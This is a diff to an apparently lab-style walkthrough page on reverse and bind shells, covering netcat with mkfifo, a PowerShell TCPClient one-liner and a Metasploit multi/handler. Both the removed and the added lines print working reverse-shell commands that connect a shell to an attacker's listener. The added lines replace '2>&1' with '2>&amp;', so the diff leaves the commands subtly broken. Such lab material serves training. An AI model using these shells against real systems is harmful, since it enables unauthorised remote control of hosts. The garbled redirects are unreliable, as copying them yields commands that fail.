@@ -190,14 +190,14 @@ The following example provides shell on target with `bash`. The first command pr
 nc <local-ip> <port> -e /bin/bash{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 An alternate method to create reverse/bind shell listener with `bash` without using `-e` option of `netcat`.
-{% capture code %}{% raw %}mkfifo /tmp/f; nc -lvnp <port> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
-mkfifo /tmp/f; nc <local-ip> <port> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f{% endraw %}{% endcapture %} {% include code.html code=code %}
+{% capture code %}{% raw %}mkfifo /tmp/f; nc -lvnp <port> < /tmp/f | /bin/sh >/tmp/f 2>&amp;; rm /tmp/f
+mkfifo /tmp/f; nc <local-ip> <port> < /tmp/f | /bin/sh >/tmp/f 2>&amp;; rm /tmp/f{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 
 ### Powershell listener
 
 The following is a one-liner to be used in `cmd` which invokes a `reverse shell` from target.
-{% capture code %}{% raw %}powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"{% endraw %}{% endcapture %} {% include code.html code=code %}
+{% capture code %}{% raw %}powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&amp; | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 
 ## Task 9 - msfvenom
@@ -383,7 +383,7 @@ An output similar to below will be obtained, which mentions the listener is acti
 {% capture code %}{% raw %}Listening on [0.0.0.0] (family 0, port 443){% endraw %}{% endcapture %} {%include code.html code=code %}
 
 Activate the `reverse shell` from the target.
-{% capture code %}{% raw %}mkfifo /tmp/f ; nc <local-ip> 443 </tmp/f | /bin/sh > /tmp/f 2>&1 ; rm -f /tmp/f{% endraw %}{% endcapture %} {%include code.html code=code %}
+{% capture code %}{% raw %}mkfifo /tmp/f ; nc <local-ip> 443 </tmp/f | /bin/sh > /tmp/f 2>&amp; ; rm -f /tmp/f{% endraw %}{% endcapture %} {%include code.html code=code %}
 
 The `reverse shell` in attacking machine would have spawned at the `netcat` listener. Use `python` to spawn `bash` shell. Background the `netcat` listener to sanitise the `reverse shell`.
 {% capture code %}{% raw %}Connection from <target-ip> 59568 received!
@@ -543,7 +543,7 @@ msf5 exploit(multi/handler) > exploit -j
 [*] Started reverse TCP handler on <local-ip>:443 {% endraw %}{% endcapture %} {%include code.html code=code %}
 
 Activate the `reverse shell` from the attacker.
-{% capture code %}{% raw %}mkfifo /tmp/f ; nc -nv <local-ip> 443 < /tmp/f | /bin/sh > /tmp/f 2>&1 ; rm -rf /tmp/f{% endraw %}{% endcapture %} {%include code.html code=code %}
+{% capture code %}{% raw %}mkfifo /tmp/f ; nc -nv <local-ip> 443 < /tmp/f | /bin/sh > /tmp/f 2>&amp; ; rm -rf /tmp/f{% endraw %}{% endcapture %} {%include code.html code=code %}
 
 An output similar to below will be obtained indicating the connection established to `msfconsole` terminal.
 {% capture code %}{% raw %}(UNKNOWN) [<local-ip>] 443 (https) open{% endraw %}{% endcapture %} {%include code.html code=code %}
@@ -580,7 +580,7 @@ msf5 exploit(multi/handler) > exploit -j
 [*] Started reverse TCP handler on <local-ip>:443 {% endraw %}{% endcapture %} {%include code.html code=code %}
 
 Activate the `reverse shell` from the attacker.
-{% capture code %}{% raw %}mkfifo /tmp/f ; nc -nv <local-ip> 443 < /tmp/f | /bin/sh > /tmp/f 2>&1 ; rm -rf /tmp/f{% endraw %}{% endcapture %} {%include code.html code=code %}
+{% capture code %}{% raw %}mkfifo /tmp/f ; nc -nv <local-ip> 443 < /tmp/f | /bin/sh > /tmp/f 2>&amp; ; rm -rf /tmp/f{% endraw %}{% endcapture %} {%include code.html code=code %}
 
 An output similar to below will be obtained indicating the connection established to `msfconsole` terminal.
 {% capture code %}{% raw %}(UNKNOWN) [<local-ip>] 443 (https) open{% endraw %}{% endcapture %} {%include code.html code=code %}
